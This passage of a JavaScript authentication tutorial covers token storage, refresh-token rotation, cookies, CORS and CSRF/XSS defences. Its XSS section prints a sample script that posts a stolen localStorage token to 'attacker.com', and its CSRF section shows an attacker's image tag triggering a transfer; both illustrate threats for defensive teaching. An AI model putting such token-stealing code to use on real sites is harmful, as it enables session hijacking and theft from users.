      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    });
    
    if (response.status === 401) {
      const refreshed = await this.tokenManager.handleExpiredToken();
      if (refreshed) {
        return this.fetch(endpoint, options);
      }
    }
    
    return response;
  }
  
  async get(endpoint, options = {}) {
    return this.fetch(endpoint, { ...options, method: 'GET' });
  }
  
  async post(endpoint, data, options = {}) {
    return this.fetch(endpoint, {
      ...options,
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
  
  async put(endpoint, data, options = {}) {
    return this.fetch(endpoint, {
      ...options,
      method: 'PUT',
      body: JSON.stringify(data)
    });
  }
  
  async delete(endpoint, options = {}) {
    return this.fetch(endpoint, { ...options, method: 'DELETE' });
  }
}
```

### Security Best Practices

**Token Storage Security Comparison**

|Storage Method|XSS Vulnerability|CSRF Vulnerability|Persistence|Recommended|
|---|---|---|---|---|
|localStorage|High|Low|Yes|No|
|sessionStorage|High|Low|Session only|No|
|Memory|Low|Low|No|Only for SPAs|
|HttpOnly Cookie|None|High (mitigated by SameSite)|Configurable|Yes|

**Mitigating XSS with CSP**

Content Security Policy headers reduce XSS risk even when tokens are in localStorage:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; connect-src 'self' https://api.example.com
```

**Mitigating CSRF with SameSite**

When using HttpOnly cookies, the `SameSite` attribute prevents CSRF:

```
Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
```

`SameSite=Strict` blocks cookies on all cross-site requests. `SameSite=Lax` allows cookies on top-level GET requests (following links).

### Logout Implementation

**Client-Side Token Clearing**

```javascript
async function logout() {
  const refreshToken = getStoredRefreshToken();
  
  // Notify server to revoke tokens
  try {
    await fetch('https://api.example.com/auth/logout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken })
    });
  } catch (error) {
    console.error('Server logout failed:', error);
  }
  
  // Clear local tokens regardless of server response
  clearTokens();
  
  // Cancel any scheduled refreshes
  tokenRefreshScheduler.cancelRefresh();
  
  // Redirect to login
  window.location.href = '/login';
}
```

**Logout Across Tabs**

Using localStorage events to synchronize logout:

```javascript
window.addEventListener('storage', (event) => {
  if (event.key === 'logout_event') {
    // Another tab logged out
    clearTokens();
    window.location.href = '/login';
  }
});

function logout() {
  // ... server logout logic
  clearTokens();
  localStorage.setItem('logout_event', Date.now().toString());
  localStorage.removeItem('logout_event');
  window.location.href = '/login';
}
```

### Token Transmission Security

**HTTPS Enforcement**

[Inference] JWTs transmitted over HTTP can be intercepted. Always use HTTPS for authentication endpoints and API calls.

**Avoiding URL Parameters**

Never pass JWTs in URL query parameters as they appear in browser history, server logs, and referrer headers:

```javascript
// WRONG
fetch(`https://api.example.com/data?token=${jwt}`);

// CORRECT
fetch('https://api.example.com/data', {
  headers: { 'Authorization': `Bearer ${jwt}` }
});
```

---

## Refresh Token Patterns

### Basic Refresh Token Flow

The standard refresh token pattern involves two types of tokens working together:

**Access Token:**

- Short-lived (typically 15 minutes to 1 hour)
- Included in every API request
- Stored in memory or sessionStorage
- Contains user claims and permissions

**Refresh Token:**

- Long-lived (days to months)
- Used only to obtain new access tokens
- Stored securely (httpOnly cookie or secure storage)
- Single-purpose: token renewal

**Basic implementation:**

```javascript
let accessToken = null;
let refreshToken = null;

async function login(credentials) {
  const response = await fetch('https://api.example.com/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(credentials)
  });
  
  const data = await response.json();
  accessToken = data.accessToken;
  refreshToken = data.refreshToken;
  
  return data;
}

async function refreshAccessToken() {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refreshToken })
  });
  
  const data = await response.json();
  accessToken = data.accessToken;
  
  // Some implementations also rotate refresh tokens
  if (data.refreshToken) {
    refreshToken = data.refreshToken;
  }
  
  return data;
}
```

### Automatic Token Refresh with Interceptor Pattern

This pattern intercepts failed requests and automatically retries after refreshing:

```javascript
async function fetchWithAuth(url, options = {}) {
  // Add access token to request
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${accessToken}`
  };
  
  let response = await fetch(url, { ...options, headers });
  
  // If 401, try refreshing token
  if (response.status === 401) {
    await refreshAccessToken();
    
    // Retry original request with new token
    headers.Authorization = `Bearer ${accessToken}`;
    response = await fetch(url, { ...options, headers });
  }
  
  return response;
}

// Usage
const data = await fetchWithAuth('https://api.example.com/user/profile')
  .then(res => res.json());
```

### Proactive Refresh Pattern

Refresh tokens before they expire, rather than waiting for 401 errors:

```javascript
let tokenExpiryTime = null;
let refreshPromise = null;

function setTokens(accessToken, expiresIn) {
  // expiresIn is typically in seconds
  tokenExpiryTime = Date.now() + (expiresIn * 1000);
  
  // Schedule refresh before expiry (e.g., 5 minutes before)
  const refreshTime = (expiresIn - 300) * 1000;
  setTimeout(proactiveRefresh, refreshTime);
}

async function proactiveRefresh() {
  try {
    const data = await refreshAccessToken();
    setTokens(data.accessToken, data.expiresIn);
  } catch (error) {
    // Handle refresh failure (e.g., logout user)
    handleAuthFailure(error);
  }
}

async function fetchWithAuth(url, options = {}) {
  // Check if token is about to expire
  const timeUntilExpiry = tokenExpiryTime - Date.now();
  const fiveMinutes = 5 * 60 * 1000;
  
  if (timeUntilExpiry < fiveMinutes) {
    // Ensure only one refresh happens at a time
    if (!refreshPromise) {
      refreshPromise = refreshAccessToken().finally(() => {
        refreshPromise = null;
      });
    }
    await refreshPromise;
  }
  
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${accessToken}`
  };
  
  return fetch(url, { ...options, headers });
}
```

### Refresh Token Rotation

A security pattern where each refresh generates a new refresh token:

```javascript
async function refreshAccessToken() {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refreshToken })
  });
  
  if (!response.ok) {
    throw new Error('Refresh failed');
  }
  
  const data = await response.json();
  
  // Update both tokens
  accessToken = data.accessToken;
  refreshToken = data.newRefreshToken; // Old refresh token is now invalid
  
  // Persist new refresh token
  await secureStorage.set('refreshToken', data.newRefreshToken);
  
  return data;
}
```

**Server-side rotation logic:**

- When refresh token is used, invalidate it immediately
- Issue new refresh token with new expiry
- Track token families to detect replay attacks
- If old token is reused, invalidate entire token family

### Sliding Session Pattern

Extends session lifetime with each activity:

```javascript
let lastActivity = Date.now();
const activityThreshold = 5 * 60 * 1000; // 5 minutes

async function fetchWithAuth(url, options = {}) {
  const now = Date.now();
  
  // If user has been active recently, extend session
  if (now - lastActivity < activityThreshold) {
    const timeUntilExpiry = tokenExpiryTime - now;
    const halfLife = (tokenExpiryTime - (tokenExpiryTime - lastActivity)) / 2;
    
    if (timeUntilExpiry < halfLife) {
      // Refresh to extend session
      await refreshAccessToken();
    }
  }
  
  lastActivity = now;
  
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${accessToken}`
  };
  
  return fetch(url, { ...options, headers });
}
```

### Silent Refresh with Hidden Iframe (OAuth2)

Used in browser-based OAuth2 flows:

```javascript
function silentRefresh() {
  return new Promise((resolve, reject) => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    
    // Set up message listener
    const messageHandler = (event) => {
      if (event.origin !== 'https://auth.example.com') return;
      
      window.removeEventListener('message', messageHandler);
      document.body.removeChild(iframe);
      
      if (event.data.error) {
        reject(new Error(event.data.error));
      } else {
        accessToken = event.data.accessToken;
        resolve(event.data);
      }
    };
    
    window.addEventListener('message', messageHandler);
    
    // Load authorization endpoint with prompt=none
    iframe.src = 'https://auth.example.com/authorize?prompt=none&...';
    document.body.appendChild(iframe);
    
    // Timeout after 10 seconds
    setTimeout(() => {
      window.removeEventListener('message', messageHandler);
      document.body.removeChild(iframe);
      reject(new Error('Silent refresh timeout'));
    }, 10000);
  });
}
```

### Concurrent Request Handling

Prevent multiple simultaneous refresh requests:

```javascript
let refreshPromise = null;

async function getValidAccessToken() {
  // If already refreshing, wait for that to complete
  if (refreshPromise) {
    return refreshPromise;
  }
  
  // Check if current token is valid
  if (isTokenValid(accessToken)) {
    return accessToken;
  }
  
  // Start refresh and cache the promise
  refreshPromise = refreshAccessToken()
    .then(data => {
      accessToken = data.accessToken;
      return accessToken;
    })
    .finally(() => {
      refreshPromise = null;
    });
  
  return refreshPromise;
}

async function fetchWithAuth(url, options = {}) {
  const token = await getValidAccessToken();
  
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${token}`
  };
  
  return fetch(url, { ...options, headers });
}
```

### Storage Strategies

**Memory-only (most secure for access tokens):**

```javascript
// Access token in closure/memory
let accessToken = null;

// Lost on page refresh, requires re-authentication
```

**sessionStorage (tab-scoped):**

```javascript
function setAccessToken(token) {
  sessionStorage.setItem('accessToken', token);
}

function getAccessToken() {
  return sessionStorage.getItem('accessToken');
}

// Lost when tab closes
// Not shared across tabs
```

**localStorage (persistent, cross-tab):**

```javascript
function setRefreshToken(token) {
  localStorage.setItem('refreshToken', token);
}

function getRefreshToken() {
  return localStorage.getItem('refreshToken');
}

// Persists across sessions
// Shared across tabs
// Vulnerable to XSS
```

**httpOnly Cookies (most secure for refresh tokens):**

```javascript
// Server sets cookie
res.cookie('refreshToken', token, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,    // HTTPS only
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
});

// Client automatically sends cookie
async function refreshAccessToken() {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    credentials: 'include' // Include cookies
  });
  
  const data = await response.json();
  return data.accessToken;
}
```

### Error Handling and Recovery

```javascript
async function fetchWithAuth(url, options = {}) {
  try {
    const token = await getValidAccessToken();
    
    const headers = {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    };
    
    const response = await fetch(url, { ...options, headers });
    
    if (response.status === 401) {
      // Try refresh one more time
      await refreshAccessToken();
      
      const retryHeaders = {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`
      };
      
      const retryResponse = await fetch(url, { ...options, headers: retryHeaders });
      
      if (retryResponse.status === 401) {
        // Refresh token invalid or expired
        handleLogout();
        throw new Error('Authentication failed');
      }
      
      return retryResponse;
    }
    
    return response;
    
  } catch (error) {
    if (error.message.includes('refresh')) {
      // Refresh token expired or invalid
      handleLogout();
    }
    throw error;
  }
}

function handleLogout() {
  accessToken = null;
  refreshToken = null;
  localStorage.removeItem('refreshToken');
  sessionStorage.clear();
  
  // Redirect to login
  window.location.href = '/login';
}
```

### Token Refresh with Retry Logic

```javascript
async function refreshWithRetry(maxRetries = 3, delay = 1000) {
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      return await refreshAccessToken();
    } catch (error) {
      const isLastAttempt = attempt === maxRetries - 1;
      
      if (isLastAttempt) {
        throw error;
      }
      
      // Exponential backoff
      await new Promise(resolve => 
        setTimeout(resolve, delay * Math.pow(2, attempt))
      );
    }
  }
}
```

### Background Refresh Worker

Using Web Workers for token management:

```javascript
// worker.js
let accessToken = null;
let refreshToken = null;
let refreshTimer = null;

self.addEventListener('message', async (event) => {
  const { type, payload } = event.data;
  
  switch (type) {
    case 'INIT':
      accessToken = payload.accessToken;
      refreshToken = payload.refreshToken;
      scheduleRefresh(payload.expiresIn);
      break;
      
    case 'GET_TOKEN':
      self.postMessage({ type: 'TOKEN', token: accessToken });
      break;
      
    case 'REFRESH':
      await performRefresh();
      break;
  }
});

async function performRefresh() {
  try {
    const response = await fetch('https://api.example.com/auth/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken })
    });
    
    const data = await response.json();
    accessToken = data.accessToken;
    
    self.postMessage({ 
      type: 'REFRESHED', 
      accessToken: data.accessToken 
    });
    
    scheduleRefresh(data.expiresIn);
  } catch (error) {
    self.postMessage({ type: 'REFRESH_FAILED', error: error.message });
  }
}

function scheduleRefresh(expiresIn) {
  clearTimeout(refreshTimer);
  // Refresh 5 minutes before expiry
  const refreshTime = (expiresIn - 300) * 1000;
  refreshTimer = setTimeout(performRefresh, refreshTime);
}

// main.js
const tokenWorker = new Worker('worker.js');

tokenWorker.postMessage({
  type: 'INIT',
  payload: { accessToken, refreshToken, expiresIn: 3600 }
});

tokenWorker.addEventListener('message', (event) => {
  const { type, token, error } = event.data;
  
  if (type === 'REFRESHED') {
    accessToken = token;
  } else if (type === 'REFRESH_FAILED') {
    handleLogout();
  }
});
```

### Cross-Tab Synchronization

Synchronize tokens across multiple tabs:

```javascript
// Storage event listener for cross-tab communication
window.addEventListener('storage', (event) => {
  if (event.key === 'accessToken') {
    accessToken = event.newValue;
  }
  
  if (event.key === 'logout') {
    // Another tab logged out
    handleLogout();
  }
});

function setAccessToken(token) {
  accessToken = token;
  localStorage.setItem('accessToken', token);
  localStorage.setItem('tokenTimestamp', Date.now().toString());
}

function logout() {
  accessToken = null;
  localStorage.removeItem('accessToken');
  localStorage.setItem('logout', Date.now().toString());
}

// Using BroadcastChannel API (modern approach)
const authChannel = new BroadcastChannel('auth');

authChannel.addEventListener('message', (event) => {
  const { type, payload } = event.data;
  
  switch (type) {
    case 'TOKEN_REFRESHED':
      accessToken = payload.accessToken;
      break;
      
    case 'LOGOUT':
      handleLogout();
      break;
  }
});

function broadcastTokenRefresh(token) {
  authChannel.postMessage({
    type: 'TOKEN_REFRESHED',
    payload: { accessToken: token }
  });
}
```

### Refresh Token Security Best Practices

**Storage security:**

- Store refresh tokens in httpOnly cookies when possible
- Never store refresh tokens in localStorage for production apps
- Use secure, sameSite cookie attributes
- Encrypt tokens if storing in localStorage (though still not recommended)

**Network security:**

- Always use HTTPS for token transmission
- Implement refresh token rotation
- Set appropriate token lifetimes (access: 15min-1hr, refresh: 7-30 days)
- Use short-lived access tokens

**Detection and prevention:**

```javascript
// Track token usage to detect anomalies
async function refreshAccessToken() {
  const deviceFingerprint = await getDeviceFingerprint();
  
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: { 
      'Content-Type': 'application/json',
      'X-Device-ID': deviceFingerprint
    },
    body: JSON.stringify({ refreshToken })
  });
  
  if (response.status === 403) {
    // Possible token theft detected
    handleSecurityEvent();
  }
  
  return response.json();
}
```

**Server-side validation:**

[Inference]: These patterns are commonly implemented but specific behavior depends on server implementation.

- Validate device/browser fingerprint
- Check IP address changes
- Implement token families for rotation
- Detect and invalidate compromised token families
- Rate-limit refresh endpoint
- Log all refresh attempts

### Mobile/Native App Considerations

**Secure storage on mobile:**

```javascript
// React Native with secure storage
import * as SecureStore from 'expo-secure-store';

async function saveRefreshToken(token) {
  await SecureStore.setItemAsync('refreshToken', token);
}

async function getRefreshToken() {
  return await SecureStore.getItemAsync('refreshToken');
}

// Use Keychain (iOS) or Keystore (Android) through secure storage
```

**Background refresh:**

- Implement refresh before app suspension
- Use background tasks for proactive refresh
- Handle network connectivity changes
- Implement offline queue for failed requests

### Performance Optimization

**Batch requests during refresh:**

```javascript
const pendingRequests = [];
let isRefreshing = false;

async function fetchWithAuth(url, options = {}) {
  if (isRefreshing) {
    // Queue request until refresh completes
    return new Promise((resolve, reject) => {
      pendingRequests.push({ resolve, reject, url, options });
    });
  }
  
  const token = await getValidAccessToken();
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${token}`
  };
  
  const response = await fetch(url, { ...options, headers });
  
  if (response.status === 401 && !isRefreshing) {
    isRefreshing = true;
    
    try {
      await refreshAccessToken();
      
      // Retry all pending requests
      pendingRequests.forEach(async ({ resolve, reject, url, options }) => {
        try {
          const retryHeaders = {
            ...options.headers,
            'Authorization': `Bearer ${accessToken}`
          };
          const retryResponse = await fetch(url, { ...options, headers: retryHeaders });
          resolve(retryResponse);
        } catch (error) {
          reject(error);
        }
      });
      
      pendingRequests.length = 0;
      
      // Retry original request
      const retryHeaders = {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`
      };
      return fetch(url, { ...options, headers: retryHeaders });
      
    } finally {
      isRefreshing = false;
    }
  }
  
  return response;
}
```

---

## Session Management (Authentication)

### Cookie-Based Session Management

#### Setting Cookies from Server

The server sets session cookies in the response headers:

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123xyz; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

#### Cookie Attributes

**HttpOnly** Prevents JavaScript access to the cookie:

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

The cookie is only sent in HTTP requests, not accessible via `document.cookie`.

**Secure** Cookie only sent over HTTPS:

```http
Set-Cookie: sessionId=abc123; Secure
```

**SameSite** Controls cross-site cookie sending:

- `SameSite=Strict`: Cookie never sent in cross-site requests
- `SameSite=Lax`: Cookie sent in top-level navigation (clicking links), not in cross-site subrequests
- `SameSite=None`: Cookie sent in all contexts (requires `Secure`)

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure
```

**Domain and Path** Scope the cookie to specific domains/paths:

```http
Set-Cookie: sessionId=abc123; Domain=.example.com; Path=/api
```

**Max-Age and Expires** Control cookie lifetime:

```http
Set-Cookie: sessionId=abc123; Max-Age=3600
Set-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT
```

#### Sending Cookies with Fetch

**Same-Origin Requests** Cookies sent automatically by default:

```javascript
fetch('/api/data'); // Cookies included automatically
```

**Cross-Origin Requests** Require explicit credentials mode:

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include' // Required for cross-origin cookies
});
```

**Credentials Mode Options**

- `'omit'`: Never send cookies
- `'same-origin'`: Send cookies only for same-origin requests (default)
- `'include'`: Always send cookies (requires CORS headers)

#### Server CORS Requirements for Cookies

When using `credentials: 'include'`, the server must respond with:

```http
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Credentials: true
```

**Critical restrictions**:

- `Access-Control-Allow-Origin` cannot be `*`
- Must specify the exact origin
- `Access-Control-Allow-Credentials: true` is required

#### Login Flow with Cookies

**Client Login Request**

```javascript
fetch('https://api.example.com/login', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: 'user',
    password: 'pass'
  })
});
```

**Server Response**

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
Access-Control-Allow-Origin: https://yourdomain.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"success": true, "user": {...}}
```

**Subsequent Authenticated Requests**

```javascript
fetch('https://api.example.com/protected', {
  credentials: 'include' // Browser automatically includes sessionId cookie
});
```

#### Logout Flow

```javascript
fetch('https://api.example.com/logout', {
  method: 'POST',
  credentials: 'include'
});
```

**Server Logout Response**

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=; HttpOnly; Secure; Max-Age=0
```

Setting `Max-Age=0` or `Expires` to a past date deletes the cookie.

### Token-Based Authentication (JWT/Bearer Tokens)

#### Login and Token Retrieval

**Login Request**

```javascript
const response = await fetch('https://api.example.com/login', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    username: 'user',
    password: 'pass'
  })
});

const data = await response.json();
const token = data.token; // JWT or bearer token
```

**Server Response**

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "expiresIn": 3600,
  "refreshToken": "def456..."
}
```

#### Token Storage Options

**localStorage**

```javascript
localStorage.setItem('authToken', token);

// Retrieve
const token = localStorage.getItem('authToken');
```

**Characteristics**:

- Persists across browser sessions
- Accessible via JavaScript (XSS vulnerability)
- Same-origin only
- No expiration mechanism

**sessionStorage**

```javascript
sessionStorage.setItem('authToken', token);

// Retrieve
const token = sessionStorage.getItem('authToken');
```

**Characteristics**:

- Cleared when tab/window closes
- Accessible via JavaScript (XSS vulnerability)
- Same-origin only
- Per-tab isolation

**Memory (Variable)**

```javascript
let authToken = null;

// After login
authToken = data.token;
```

**Characteristics**:

- Lost on page reload
- Not accessible to other tabs
- Most secure against XSS if properly scoped
- Requires re-authentication on refresh

**Comparison Table**

|Storage|Persistence|XSS Risk|Cross-Tab|Page Reload|
|---|---|---|---|---|
|localStorage|Yes|High|Yes|Survives|
|sessionStorage|Session only|High|No|Survives|
|Memory|No|Lower|No|Lost|
|HttpOnly Cookie|Configurable|None|Yes|Survives|

#### Sending Tokens in Requests

**Authorization Header (Recommended)**

```javascript
fetch('https://api.example.com/protected', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**Custom Header**

```javascript
fetch('https://api.example.com/protected', {
  headers: {
    'X-Auth-Token': token
  }
});
```

[Inference: Custom headers trigger CORS preflight for cross-origin requests]

**Query Parameter (Not Recommended)**

```javascript
fetch(`https://api.example.com/protected?token=${token}`);
```

[Unverified: This approach has security issues as tokens may be logged in server logs and browser history]

#### Complete Token Authentication Pattern

```javascript
class AuthService {
  constructor() {
    this.token = null;
  }

  async login(username, password) {
    const response = await fetch('https://api.example.com/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });

    if (!response.ok) {
      throw new Error('Login failed');
    }

    const data = await response.json();
    this.token = data.token;
    localStorage.setItem('authToken', data.token);
    return data;
  }

  async authenticatedFetch(url, options = {}) {
    if (!this.token) {
      this.token = localStorage.getItem('authToken');
    }

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.token}`
      }
    });

    if (response.status === 401) {
      // Token expired or invalid
      this.logout();
      throw new Error('Authentication required');
    }

    return response;
  }

  logout() {
    this.token = null;
    localStorage.removeItem('authToken');
  }
}
```

### Token Refresh Mechanisms

#### Refresh Token Flow

**Initial Login Response**

```json
{
  "accessToken": "eyJ...",
  "refreshToken": "def...",
  "expiresIn": 900
}
```

**Access Token Expires** When the access token expires (typically 15 minutes), use the refresh token:

```javascript
async function refreshAccessToken() {
  const refreshToken = localStorage.getItem('refreshToken');
  
  const response = await fetch('https://api.example.com/refresh', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ refreshToken })
  });

  const data = await response.json();
  localStorage.setItem('authToken', data.accessToken);
  return data.accessToken;
}
```

#### Automatic Token Refresh

**Intercepting 401 Responses**

```javascript
async function authenticatedFetch(url, options = {}) {
  const token = localStorage.getItem('authToken');
  
  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });

  if (response.status === 401) {
    // Token expired, attempt refresh
    const newToken = await refreshAccessToken();
    
    // Retry original request with new token
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${newToken}`
      }
    });
  }

  return response;
}
```

#### Proactive Token Refresh

**Using Token Expiration Time**

```javascript
function scheduleTokenRefresh(expiresIn) {
  // Refresh 5 minutes before expiration
  const refreshTime = (expiresIn - 300) * 1000;
  
  setTimeout(async () => {
    try {
      await refreshAccessToken();
      // Schedule next refresh
      scheduleTokenRefresh(expiresIn);
    } catch (error) {
      // Refresh failed, redirect to login
      window.location.href = '/login';
    }
  }, refreshTime);
}

// After login
scheduleTokenRefresh(data.expiresIn);
```

### Handling Authentication State

#### Checking Authentication Status

**Token Verification Endpoint**

```javascript
async function checkAuthStatus() {
  const token = localStorage.getItem('authToken');
  
  if (!token) {
    return false;
  }

  try {
    const response = await fetch('https://api.example.com/verify', {
      headers: {
        'Authorization': `Bearer ${token}`
      }
    });

    return response.ok;
  } catch (error) {
    return false;
  }
}
```

**Client-Side JWT Decoding**

```javascript
function decodeJWT(token) {
  const base64Url = token.split('.')[1];
  const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  const jsonPayload = decodeURIComponent(
    atob(base64)
      .split('')
      .map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
      .join('')
  );

  return JSON.parse(jsonPayload);
}

function isTokenExpired(token) {
  const decoded = decodeJWT(token);
  const currentTime = Date.now() / 1000;
  return decoded.exp < currentTime;
}
```

[Unverified: Client-side JWT validation does not verify signature and should not be solely relied upon for security decisions]

#### Route Protection

**Redirect Unauthenticated Users**

```javascript
async function protectedRoute() {
  const isAuthenticated = await checkAuthStatus();
  
  if (!isAuthenticated) {
    window.location.href = '/login';
    return;
  }

  // Load protected content
  loadProtectedContent();
}
```

### Security Considerations

#### XSS Protection

**Token Storage Vulnerabilities** Tokens stored in `localStorage` or `sessionStorage` are vulnerable to XSS attacks:

```javascript
// Malicious script can access token
const stolenToken = localStorage.getItem('authToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

**Mitigation Strategies**:

- Use `HttpOnly` cookies when possible
- Implement Content Security Policy (CSP)
- Sanitize user input
- Use framework XSS protections

#### CSRF Protection

**Cookie-Based Sessions are Vulnerable** Cookies are automatically sent with requests, making them vulnerable to CSRF:

```html
<!-- Attacker's page -->
<img src="https://api.example.com/transfer?amount=1000&to=attacker" />
```

**CSRF Token Pattern**

```javascript
// Server includes CSRF token in response
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('https://api.example.com/action', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ data: 'value' })
});
```

**SameSite Cookie Attribute**

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
```

[Inference: `SameSite=Strict` provides strong CSRF protection by preventing cookies from being sent in cross-site requests]

#### Token-Based CSRF Resistance

Bearer tokens in `Authorization` headers are not automatically sent by browsers:

```javascript
// Attacker cannot trigger this from their site
fetch('https://api.example.com/action', {
  headers: {
    'Authorization': `Bearer ${token}` // Not automatically included
  }
});
```

[Inference: This provides inherent CSRF protection as the attacker cannot access the token from a different origin]

### Hybrid Approaches

#### Dual Token Strategy

**Access Token in Memory, Refresh Token in HttpOnly Cookie**

```javascript
// Login response sets HttpOnly refresh cookie
// Client stores access token in memory
let accessToken = null;

fetch('https://api.example.com/login', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({ username, password })
})
.then(response => response.json())
.then(data => {
  accessToken = data.accessToken; // Short-lived, in memory
  // refreshToken automatically stored in HttpOnly cookie
});
```

**Benefits**:

- Access token not vulnerable to XSS (memory only)
- Refresh token not accessible to JavaScript (HttpOnly)
- Refresh token protected from CSRF (SameSite)

**Refresh Flow**

```javascript
async function refreshToken() {
  const response = await fetch('https://api.example.com/refresh', {
    method: 'POST',
    credentials: 'include' // Sends HttpOnly refresh cookie
  });

  const data = await response.json();
  accessToken = data.accessToken;
}
```

### Session Management Patterns

#### Concurrent Session Handling

**Single Session Per User** Server invalidates previous sessions on new login:

```javascript
// Server-side logic
async function login(userId, newSessionId) {
  await invalidateAllUserSessions(userId);
  await createSession(userId, newSessionId);
}
```

**Multiple Concurrent Sessions** Allow users to be logged in on multiple devices:

```javascript
// Each device gets unique session identifier
Set-Cookie: sessionId=device1_abc123; ...
Set-Cookie: sessionId=device2_xyz789; ...
```

#### Session Expiration

**Absolute Timeout** Session expires after fixed duration regardless of activity:

```javascript
const expiresAt = Date.now() + (24 * 60 * 60 * 1000); // 24 hours
```

**Idle Timeout** Session expires after period of inactivity:

```javascript
let lastActivity = Date.now();

function resetIdleTimer() {
  lastActivity = Date.now();
}

// Check idle timeout
setInterval(() => {
  const idleTime = Date.now() - lastActivity;
  if (idleTime > 15 * 60 * 1000) { // 15 minutes
    logout();
  }
}, 60000); // Check every minute

// Reset on user activity
document.addEventListener('click', resetIdleTimer);
document.addEventListener('keypress', resetIdleTimer);
```

**Sliding Window** Session extends with each request:

```http
Set-Cookie: sessionId=abc123; Max-Age=3600
```

Each authenticated request resets the `Max-Age`.

#### Session Persistence Across Page Loads

**Using sessionStorage**

```javascript
// Before page unload
window.addEventListener('beforeunload', () => {
  sessionStorage.setItem('authState', JSON.stringify({
    token: accessToken,
    user: currentUser
  }));
});

// On page load
window.addEventListener('load', () => {
  const authState = sessionStorage.getItem('authState');
  if (authState) {
    const { token, user } = JSON.parse(authState);
    accessToken = token;
    currentUser = user;
  }
});
```

### Multi-Tab Synchronization

#### Broadcasting Auth State Changes

**Using BroadcastChannel API**

```javascript
const authChannel = new BroadcastChannel('auth_channel');

// On login
authChannel.postMessage({ type: 'login', token: accessToken });

// On logout
authChannel.postMessage({ type: 'logout' });

// Listen in other tabs
authChannel.addEventListener('message', (event) => {
  if (event.data.type === 'login') {
    accessToken = event.data.token;
    updateUIForLoggedInUser();
  } else if (event.data.type === 'logout') {
    accessToken = null;
    updateUIForLoggedOutUser();
  }
});
```

**Using localStorage Events**

```javascript
// On logout in one tab
localStorage.removeItem('authToken');

// Listen in other tabs
window.addEventListener('storage', (event) => {
  if (event.key === 'authToken') {
    if (event.newValue === null) {
      // Token removed, user logged out
      handleLogout();
    } else {
      // New token set
      handleLogin(event.newValue);
    }
  }
});
```

### Error Handling

#### Authentication Errors

**401 Unauthorized**

```javascript
fetch('https://api.example.com/protected', {
  headers: { 'Authorization': `Bearer ${token}` }
})
.then(response => {
  if (response.status === 401) {
    // Token invalid or expired
    return handleAuthenticationError();
  }
  return response.json();
});

async function handleAuthenticationError() {
  // Try refresh
  try {
    await refreshAccessToken();
    // Retry request
  } catch (error) {
    // Refresh failed, redirect to login
    window.location.href = '/login';
  }
}
```

**403 Forbidden**

```javascript
if (response.status === 403) {
  // User authenticated but lacks permissions
  showErrorMessage('You do not have permission to access this resource');
}
```

#### Network Errors

**Handling Offline Scenarios**

```javascript
async function authenticatedFetch(url, options) {
  try {
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
    return response;
